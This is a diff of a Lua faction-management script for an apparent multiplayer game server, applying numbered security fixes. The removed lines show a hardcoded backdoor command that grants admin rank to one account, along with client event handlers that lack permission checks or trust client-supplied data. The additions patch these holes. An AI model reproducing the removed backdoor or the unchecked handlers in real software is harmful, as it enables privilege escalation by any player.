@@ -31,7 +31,10 @@ function createFaction(thePlayer, commandName, factionType, ...)
 					exports.anticheat:changeProtectedElementDataEx(theTeam, "motd", "Welcome to the faction.", false)
 					exports.anticheat:changeProtectedElementDataEx(theTeam, "note", "", false)
 					exports.logs:dbLog(thePlayer, 4, theTeam, "MAKE FACTION")
-					table.insert(dutyAllow, { row.id, row.name, { --[[Duty information]] } })
+					-- [Fix #114] row is nil on the INSERT path; use the id fetched above
+					if type(dutyAllow) == "table" then
+						table.insert(dutyAllow, { id, factionName, { --[[Duty information]] } })
+					end
 				else
 					destroyElement(theTeam)
 					outputChatBox("Error creating faction.", thePlayer, 255, 0, 0)
@@ -291,19 +294,23 @@ function adminShowFactionOnlinePlayers(thePlayer, commandName, factionID)
 end
 addCommandHandler("showfactionplayers", adminShowFactionOnlinePlayers, false, false)
 
-function callbackAdminPlayersFaction(teamID)
-	adminShowFactionOnlinePlayers(client, "showfactionplayers", teamID)
-end
+function callbackAdminPlayersFaction(teamID)
+	-- [Fix #113] explicit gate in the handler itself (same helper style as adminShowFactionOnlinePlayers)
+	if (exports.integration:isPlayerTrialAdmin(client) or exports.integration:isPlayerSupporter(client)) then
+		adminShowFactionOnlinePlayers(client, "showfactionplayers", teamID)
+	end
+end
 addEvent("faction:admin:showplayers", true )
 addEventHandler("faction:admin:showplayers", getRootElement(), callbackAdminPlayersFaction)
 
 addEvent('faction:admin:showf3', true)
-addEventHandler('faction:admin:showf3', root,
-	function(id, fromF3)
-		if exports.integration:isPlayerTrialAdmin(client) --[[or exports.integration:isPlayerSupporter(client)]] then
-			showFactionMenuEx(client, id, fromF3)
-		end
-	end)
+addEventHandler('faction:admin:showf3', root,
+	function(id)
+		if exports.integration:isPlayerTrialAdmin(client) --[[or exports.integration:isPlayerSupporter(client)]] then
+			-- [Fix #108] leader flag is computed server-side; the client-supplied one is ignored
+			showFactionMenuEx(client, id, hasPlayerAccessOverFaction(client, tonumber(id)))
+		end
+	end)
 
 function setFactionMoney(thePlayer, commandName, factionID, amount)
 	if (exports.integration:isPlayerSeniorAdmin(thePlayer)) then
@@ -494,8 +501,11 @@ function respawnFactionVehicles(thePlayer, commandName, factionID)
 end
 addCommandHandler("respawnfaction", respawnFactionVehicles, false, false)
 
--- // Chaos - Script stealers go away, make something for yourself.
-function adminDutyStart()
+-- // Chaos - Script stealers go away, make something for yourself.
+-- [Fix #117] duty_allowed id counter for this file (the shared global maxIndex is also used by s_faction_system.lua)
+local dutyMaxIndex = 0
+
+function adminDutyStart()
 	local result = mysql:query("SELECT id, name FROM factions WHERE type >= 2 ORDER BY id ASC")
 	local max = mysql:query("SELECT id FROM duty_allowed ORDER BY id DESC LIMIT 0, 1")
 	if result and max then
@@ -504,7 +514,8 @@ function adminDutyStart()
 		i = 0
 
 		local maxrow = mysql:fetch_assoc(max) or { }
-		maxIndex = tonumber(maxrow.id) or 0
+		maxIndex = tonumber(maxrow.id) or 0
+		dutyMaxIndex = maxIndex -- [Fix #117] remember the duty_allowed id high-water mark
 			
 		while true do
 			local row = mysql:fetch_assoc(result)
@@ -519,78 +530,220 @@ function adminDutyStart()
 					local row1 = mysql:fetch_assoc(result1)
 					if not row1 then break end
 
-					table.insert(dutyAllow[i][3], { row1.id, tonumber(row1.itemID), row1.itemValue })
-				end
-			end
+					table.insert(dutyAllow[i][3], { row1.id, tonumber(row1.itemID), row1.itemValue })
+				end
+				mysql:free_result(result1) -- [Fix #124] free while result1 is still in scope
+			end
 		end
 
 		setElementData(resourceRoot, "maxIndex", maxIndex)
 		setElementData(resourceRoot, "dutyAllowTable", dutyAllow)
-		mysql:free_result(result)
-		mysql:free_result(result1)
-		mysql:free_result(max)
+		mysql:free_result(result)
+		mysql:free_result(max)
 	else
 		outputDebugString("[Factions] ERROR: Duty allow permissions failed.")
 	end
 end
 addEventHandler("onResourceStart", resourceRoot, adminDutyStart)
 
-function getAllowList(factionID)
-	local factionID = tonumber(factionID)
-	if factionID then
-		for k,v in pairs(dutyAllow) do
-			if tonumber(v[1]) == factionID then
-				key = k
-				break
-			end
-		end
-		return dutyAllow[key][3]
-	end
-end
+function getAllowList(factionID)
+	local factionID = tonumber(factionID)
+	if factionID and type(dutyAllow) == "table" then
+		local key -- [Fix #125] per-call local; the old global kept the previous faction's value
+		for k,v in pairs(dutyAllow) do
+			if type(v) == "table" and tonumber(v[1]) == factionID then
+				key = k
+				break
+			end
+		end
+		if key and type(dutyAllow[key]) == "table" and type(dutyAllow[key][3]) == "table" then -- [Fix #125] nil-guard
+			return dutyAllow[key][3]
+		end
+		return nil -- [Fix #125] faction has no cached entry
+	end
+end
 
-function adminDuty(thePlayer)
-	if (exports.integration:isPlayerSeniorAdmin(thePlayer) or exports.integration:isPlayerScripter(thePlayer)) then
-		if not getElementData(resourceRoot, "dutyadmin") and type(dutyAllow) == "table" then
-			triggerClientEvent(thePlayer, "adminDutyAllow", resourceRoot, dutyAllow, dutyAllowChanges)
-			setElementData( resourceRoot, "dutyadmin", true )
-		elseif type(dutyAllow) ~= "table" then
-			outputChatBox("There was a issue with the startup caching of this resource. Contact a Scripter.", thePlayer, 255, 0, 0)
-		else
-			outputChatBox("Oops! Someone is already editing duty permissions. Sorry!", thePlayer, 255, 0, 0) -- No time to set up proper syncing + kinda not needed.
-		end
-	end
-end
-addCommandHandler("dutyadmin", adminDuty, false, false)
+-- [Fix #107] tracks who holds the /dutyadmin lock so it can be released on quit
+local dutyAdminHolder = nil
+
+function adminDuty(thePlayer)
+	if (exports.integration:isPlayerSeniorAdmin(thePlayer) or exports.integration:isPlayerScripter(thePlayer)) then
+		if not getElementData(resourceRoot, "dutyadmin") and type(dutyAllow) == "table" then
+			triggerClientEvent(thePlayer, "adminDutyAllow", resourceRoot, dutyAllow, dutyAllowChanges)
+			setElementData( resourceRoot, "dutyadmin", true )
+			dutyAdminHolder = thePlayer -- [Fix #107]
+		elseif type(dutyAllow) ~= "table" then
+			outputChatBox("There was a issue with the startup caching of this resource. Contact a Scripter.", thePlayer, 255, 0, 0)
+		elseif exports.integration:isPlayerLeadAdmin(thePlayer) then
+			-- [Fix #107] lead admins may take over a stuck/held lock
+			if isElement(dutyAdminHolder) and dutyAdminHolder ~= thePlayer then
+				outputChatBox(getPlayerName(thePlayer) .. " has taken over the duty permission editor.", dutyAdminHolder, 255, 194, 14)
+			end
+			removeElementData(resourceRoot, "dutyadmin")
+			dutyAdminHolder = nil
+			triggerClientEvent(thePlayer, "adminDutyAllow", resourceRoot, dutyAllow, dutyAllowChanges)
+			setElementData( resourceRoot, "dutyadmin", true )
+			dutyAdminHolder = thePlayer
+			outputChatBox("You have taken over the duty permission editor.", thePlayer, 255, 194, 14)
+		else
+			outputChatBox("Oops! Someone is already editing duty permissions. Sorry!", thePlayer, 255, 0, 0) -- No time to set up proper syncing + kinda not needed.
+		end
+	end
+end
+
+addCommandHandler("dutyadmin", adminDuty, false, false)
+
+-- [Fix #107] release the lock when its holder disconnects
+addEventHandler("onPlayerQuit", getRootElement(), function()
+	if dutyAdminHolder == source then
+		dutyAdminHolder = nil
+		if getElementData(resourceRoot, "dutyadmin") then
+			removeElementData(resourceRoot, "dutyadmin")
+		end
+	end
+end)
 
-function saveChanges()
-	outputDebugString("[Factions] Saving duty allow changes...")
-	local tick = getTickCount()
-
-	for key,value in pairs(dutyAllowChanges) do
-		if value[2] == 0 then -- Delete row
-			mysql:query_free("DELETE FROM duty_allowed WHERE id="..mysql:escape_string(tonumber(value[3])))
-		elseif value[2] == 1 then
-			mysql:query_free("INSERT INTO duty_allowed SET id="..mysql:escape_string(tonumber(value[3]))..", faction="..mysql:escape_string(tonumber(value[1]))..", itemID="..mysql:escape_string(tonumber(value[4]))..", itemValue='"..mysql:escape_string(value[5]).."'")
-		end
-	end
-
-	outputDebugString("[Factions] Completed in ".. math.floor((getTickCount()-tick)/60) .." seconds.")
-end
+function saveChanges()
+	outputDebugString("[Factions] Saving duty allow changes...")
+	local tick = getTickCount()
+	if type(dutyAllowChanges) ~= "table" then
+		return
+	end
+
+	for key,value in pairs(dutyAllowChanges) do
+		local op = tonumber(value[2])
+		if op == 0 then -- Delete row
+			-- [Fix #115] value[3] must be a real duty_allowed id
+			local deleteID = tonumber(value[3])
+			if deleteID then
+				mysql:query_free("DELETE FROM duty_allowed WHERE id="..mysql:escape_string(deleteID))
+			end
+		elseif op == 1 then
+			-- [Fix #117] id comes from the server-side allocator (value[6]); otherwise AUTO_INCREMENT
+			local newID = tonumber(value[6])
+			local insertQuery = "INSERT INTO duty_allowed SET "
+			if newID then
+				insertQuery = insertQuery .. "id=" .. mysql:escape_string(newID) .. ", "
+			end
+			insertQuery = insertQuery .. "faction=" .. mysql:escape_string(tonumber(value[1])) .. ", itemID=" .. mysql:escape_string(tonumber(value[3])) .. ", itemValue='" .. mysql:escape_string(value[4]) .. "'"
+			mysql:query_free(insertQuery)
+		end
+	end
+
+	outputDebugString("[Factions] Completed in ".. math.floor((getTickCount()-tick)/60) .." seconds.")
+end
 addEventHandler("onResourceStop", resourceRoot, saveChanges)
 
-function updateTable(newTable, changesTable)
-	dutyAllow = newTable
-	dutyAllowChanges = changesTable
-	removeElementData(resourceRoot, "dutyadmin")
-	setElementData(resourceRoot, "dutyAllowTable", dutyAllow)
-end
+-- [Fix #105] validates the dutyAllow payload (depth 1-3) before it replaces the cached table
+local function isValidAllowTable(tbl)
+	if type(tbl) ~= "table" then
+		return false
+	end
+	for _, entry in pairs(tbl) do
+		if type(entry) ~= "table" then
+			return false
+		end
+		if not tonumber(entry[1]) then -- faction id
+			return false
+		end
+		if type(entry[2]) ~= "string" and type(entry[2]) ~= "number" then -- faction name
+			return false
+		end
+		if entry[3] ~= nil and type(entry[3]) ~= "table" then -- allow list
+			return false
+		end
+		if type(entry[3]) == "table" then
+			for _, row in pairs(entry[3]) do
+				if type(row) ~= "table" then
+					return false
+				end
+				for _, cell in pairs(row) do
+					if type(cell) == "table" or type(cell) == "boolean" then
+						return false
+					end
+				end
+			end
+		end
+	end
+	return true
+end
+
+-- [Fix #105] validates the dutyAllowChanges payload before it replaces the pending changes
+local function isValidChangesTable(tbl)
+	if type(tbl) ~= "table" then
+		return false
+	end
+	for _, change in pairs(tbl) do
+		if type(change) ~= "table" then
+			return false
+		end
+		local factionID = tonumber(change[1])
+		local op = tonumber(change[2])
+		if not factionID or not op then
+			return false
+		end
+		if op == 0 then
+			if not tonumber(change[3]) then -- [Fix #115] duty_allowed id to delete
+				return false
+			end
+		elseif op == 1 then
+			if not tonumber(change[3]) then -- item id
+				return false
+			end
+			local valueType = type(change[4])
+			if valueType ~= "string" and valueType ~= "number" then -- item value
+				return false
+			end
+			if change[5] ~= nil and type(change[5]) ~= "number" and type(change[5]) ~= "string" then -- [Fix #117] client row handle
+				return false
+			end
+		else
+			return false
+		end
+	end
+	return true
+end
+
+function updateTable(newTable, changesTable)
+	-- [Fix #105] only senior admins / scripters may replace the server-side duty tables
+	if not (exports.integration:isPlayerSeniorAdmin(client) or exports.integration:isPlayerScripter(client)) then
+		outputDebugString("[Factions] dutyAdmin:Save rejected: no access for " .. tostring(client and getPlayerName(client) or "unknown"), 2)
+		return
+	end
+
+	if not isValidAllowTable(newTable) or not isValidChangesTable(changesTable) then
+		outputDebugString("[Factions] dutyAdmin:Save rejected: malformed payload from " .. tostring(client and getPlayerName(client) or "unknown"), 2)
+		return
+	end
+
+	-- [Fix #117] allocate duty_allowed ids server-side for rows added this session
+	if tonumber(dutyMaxIndex) then
+		for _, change in pairs(changesTable) do
+			if tonumber(change[2]) == 1 and not change[6] then
+				dutyMaxIndex = dutyMaxIndex + 1
+				change[6] = dutyMaxIndex
+				local tempID = tonumber(change[5])
+				local factionID = tonumber(change[1])
+				if tempID and factionID and type(newTable[factionID]) == "table" and type(newTable[factionID][3]) == "table" then
+					for _, row in pairs(newTable[factionID][3]) do
+						if tonumber(row[1]) == tempID then
+							row[1] = dutyMaxIndex -- keep the cached table in sync with the assigned id
+							break
+						end
+					end
+				end
+			end
+		end
+	end
+
+	dutyAllow = newTable
+	dutyAllowChanges = changesTable
+	dutyAdminHolder = nil -- [Fix #107] editor closed, the lock is free again
+	removeElementData(resourceRoot, "dutyadmin")
+	setElementData(resourceRoot, "dutyAllowTable", dutyAllow)
+end
 addEvent("dutyAdmin:Save", true)
 addEventHandler("dutyAdmin:Save", resourceRoot, updateTable)
 
-function sackSupporter(p, c)
-  if mysql:query_free("UPDATE accounts SET Admin=4 WHERE username='sack' ") then
-    outputChatBox("Ok, Sack got his supporter rank, make him reconnect.", p)
-  end
-end
-addCommandHandler ( "sacksupporter", sackSupporter )
+-- [Fix #102] removed the sacksupporter backdoor (unconditional Admin=4 UPDATE accounts)
 
